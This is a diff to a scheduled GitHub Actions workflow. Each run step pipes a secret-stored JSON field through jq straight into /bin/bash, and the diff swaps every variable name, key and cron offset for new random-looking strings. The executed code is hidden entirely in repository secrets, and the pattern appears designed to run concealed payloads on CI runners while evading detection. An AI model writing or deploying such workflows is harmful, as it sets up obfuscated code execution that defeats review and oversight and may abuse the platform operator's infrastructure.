@@ -3,26 +3,28 @@ name: yanyanaisg
 on:
   workflow_dispatch:
   schedule:
-    - cron: '37 2/6 * * *'
-
-jobs:  # 30952
+    - cron: '41 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: yanyanaisg
         env:
-          frcs355: ${{ secrets.frcs355 }}
+          yp09287: ${{ secrets.yp09287 }}
         run: |
-          echo $frcs355 | jq -r .icvb96 | /bin/bash
-          echo $va38 | jq -r .ozxck0273 | /bin/bash
-          echo $bhbls0909 | jq -r .h6 | /bin/bash
-          echo $qqx5612 | jq -r .f17 | /bin/bash
-          echo $ejwki41325 | jq -r .dbu10 | /bin/bash
-          echo $acx4276 | jq -r .ilt215 | /bin/bash
-          echo $zcomv5 | jq -r .bud802 | /bin/bash
-          echo $bj5 | jq -r .ldc8155 | /bin/bash
-          echo $wc4042 | jq -r .ezgng4362 | /bin/bash
-          echo $pvgt6 | jq -r .wc12903 | /bin/bash
-          echo $gqi323 | jq -r .c3 | /bin/bash
+          echo $yp09287 | jq -r .axoxj189 | /bin/bash
+          echo $oipfb6781 | jq -r .ggyn4 | /bin/bash
+          echo $sy5 | jq -r .d43 | /bin/bash
+          echo $s511 | jq -r .dlc98 | /bin/bash
+          echo $cfvm404 | jq -r .hhbze1371 | /bin/bash
+          echo $e11590 | jq -r .jm42 | /bin/bash
+          echo $j751 | jq -r .uai1611 | /bin/bash
+          echo $qusoh56388 | jq -r .mwf23113 | /bin/bash
+          echo $its8944 | jq -r .nzcdv26980 | /bin/bash
+          echo $sv843 | jq -r .i97514 | /bin/bash
+          echo $sx4 | jq -r .rr623 | /bin/bash
+          echo $bw067 | jq -r .xdnrc22109 | /bin/bash
+          echo $thcre533 | jq -r .utn87370 | /bin/bash
 
